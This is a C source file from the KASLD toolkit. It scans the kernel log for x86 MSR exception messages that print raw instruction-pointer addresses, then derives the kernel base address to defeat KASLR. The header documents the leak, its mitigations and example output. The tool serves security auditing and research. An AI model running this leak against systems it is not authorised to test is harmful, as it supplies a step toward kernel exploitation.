// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for native_read_msr and native_write_msr function pointers.
//
// The `ex_handler_msr` exception handler function prints registers
// (including RIP) to the kernel log:
//
// clang-format off
// pr_warn("unchecked MSR access error: WRMSR to 0x%x (tried to write 0x%08x%08x) at rIP: 0x%lx (%pS)\n",
//        (unsigned int)regs->cx, (unsigned int)regs->dx,
//        (unsigned int)regs->ax,  regs->ip, (void *)regs->ip);
//
// pr_warn("unchecked MSR access error: RDMSR from 0x%x at rIP: 0x%lx (%pS)\n",
//        (unsigned int)regs->cx, regs->ip, (void *)regs->ip);
// clang-format on
//
// regs->ip (RIP) address is printed as a raw pointer using "%lx" printk format.
//
// The "%pS" printk format prints the symbol name; however, if kernel symbols
// are disabled (CONFIG_KALLSYMS=n) then raw pointers are printed instead.
//
// Kernels may be compiled without debugging symbols to decrease the size of
// the kernel image.
//
// Prior to kernel v5.2-rc1~168^2^2 on 2019-03-25, the "%pF" printk format
// was used instead of "%pS". This printed raw function pointers.
//
// clang-format off
// $ dmesg | grep "unchecked MSR access error"
// [    0.133554] unchecked MSR access error: RDMSR from 0x852 at rIP: 0xffffffffad467c37 (native_read_msr+0x7/0x40)
// $ sudo grep native_read_msr /proc/kallsyms 
// [sudo] password for test: 
// ffffffffad467bf0 t native_read_msr_safe
// ffffffffad467c30 t native_read_msr
// $ ./build/dmesg_ex_handler_msr.o 
// [.] searching dmesg for native_[read|write]_msr function pointer ...
// leaked native_[read|write]_msr: ffffffffad467c37
// possible kernel base: ffffffffad400000
// clang-format on
//
// Leak primitive:
//   Data leaked:      kernel function virtual address (native_read/write_msr
//   RIP) Kernel subsystem: arch/x86/mm/extable — ex_handler_msr() Data
//   structure:   struct pt_regs → ip (instruction pointer at MSR fault) Address
//   type:     virtual (kernel text) Method:           parsed (dmesg string)
//   Status:           unfixed (uses raw %lx format for RIP)
//   Access check:     do_syslog() → check_syslog_permissions(); gated by
//                     dmesg_restrict
//   Source:
//   https://elixir.bootlin.com/linux/v6.1.1/source/arch/x86/mm/extable.c
//
// Mitigations:
//   CONFIG_KALLSYMS=y causes %pS to print symbolized names (but %lx
//   raw pointer is always printed regardless). Access gated by
//   dmesg_restrict (see dmesg.h for shared access gate details).
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/x86/mm/extable.c
// https://www.kernel.org/doc/html/latest/core-api/printk-formats.html
// https://cateee.net/lkddb/web-lkddb/KALLSYMS.html
// https://github.com/torvalds/linux/commit/d75f773c86a2b8b7278e2c33343b46a4024bc002
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Searches dmesg for x86 MSR exception handler messages that print "
    "the faulting RIP as a raw hex address (unchecked_isa_dma RIP: "
    "0x...). When CONFIG_KALLSYMS is off, the kernel uses %%lx instead "
    "of %%pS, exposing raw kernel text pointers. Access is gated by "
    "dmesg_restrict.");

KASLD_META("method:parsed\n"
           "addr:virtual\n"
           "sysctl:dmesg_restrict>=1\n"
           "bypass:CAP_SYSLOG\n"
           "fallback:/var/log/dmesg\n");

static const char *needle = " at rIP: 0x";

static int on_match(const char *line, void *ctx) {
  unsigned long *lowest = ctx;
  char *endptr;

  const char *p = strstr(line, needle);
  if (!p)
    return 1;

  unsigned long addr = strtoul(p + strlen(needle), &endptr, 16);

  if (addr && addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX) {
    if (!*lowest || addr < *lowest)
      *lowest = addr;
  }

  return 1; /* keep scanning for lowest */
}

int main(void) {
  unsigned long addr = 0;

  printf(
      "[.] searching dmesg for native_[read|write]_msr function pointer ...\n");
  int ds = dmesg_search(" at rIP: 0x", on_match, &addr);

  if (!addr) {
    if (ds < 0)
      return KASLD_EXIT_NOPERM;
    printf("[-] ex_handler_msr function pointer not found in dmesg\n");
    return 0;
  }

  printf("leaked native_[read|write]_msr: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  /* The leaked address is native_read_msr or native_write_msr —
   * specific x86 helper functions in the kernel text. */
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr,
               KASLD_REGION_KERNEL_TEXT, "native_*_msr");

  return 0;
}
